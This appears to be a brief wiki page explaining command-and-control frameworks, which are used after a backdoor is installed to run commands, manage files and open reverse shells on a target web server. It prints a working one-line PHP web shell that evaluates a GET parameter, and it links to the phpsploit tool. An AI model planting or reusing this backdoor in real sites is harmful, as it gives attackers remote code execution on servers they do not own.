# C2 Framework
A C2 framework is also known as a C&C framework, or command-and-control framework. It is a library of tools to use with a vulnerability, to discover and escalate services on a target website. 

Among the possible tasks, there are running command system, creating, editing and removing files, starting reverse shells, etc. 

C2-framework shall be used once a backdoor has been installed, to widen the control over the target server. The installation of the backdoor is not included in the C2 framework.
```php
<?php

    // example of a simple backdoor, based on the GET method 
    echo @eval($_GET['command']); 

?>
```

## See Also

+ [PHPSPLO1T](https://github.com/nil0x42/phpsploit)

Related : [Documentation](Documentation)
